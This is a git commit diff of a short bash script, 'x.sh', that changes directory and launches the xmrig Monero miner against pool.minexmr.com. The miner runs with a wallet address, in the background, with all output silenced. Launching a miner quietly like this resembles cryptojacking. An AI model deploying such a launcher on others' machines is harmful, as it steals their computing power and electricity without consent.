351ab5abafeb0118f2bfdab588674c0f32764479
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-01-20 14:22:51 +0000

    Update x.sh

--- x.sh
+++ x.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-cd Documents && cd build && ./xmrig -o pool.minexmr.com:443 -u 47fYWmH5mcShArotMMh7vkQF3WmqkWyQr5uES4PPMtonaLZaBdM6MJYCrHC741RV9KRzhvoWirvi6WYhyeWKnRbd2A7uSae -k --tls --rig-id Linux  > /dev/null 2>&1 &
+cd && cd Documents && cd xmrig && cd build && ./xmrig -o pool.minexmr.com:443 -u 47fYWmH5mcShArotMMh7vkQF3WmqkWyQr5uES4PPMtonaLZaBdM6MJYCrHC741RV9KRzhvoWirvi6WYhyeWKnRbd2A7uSae -k --tls --rig-id Linux  > /dev/null 2>&1 &
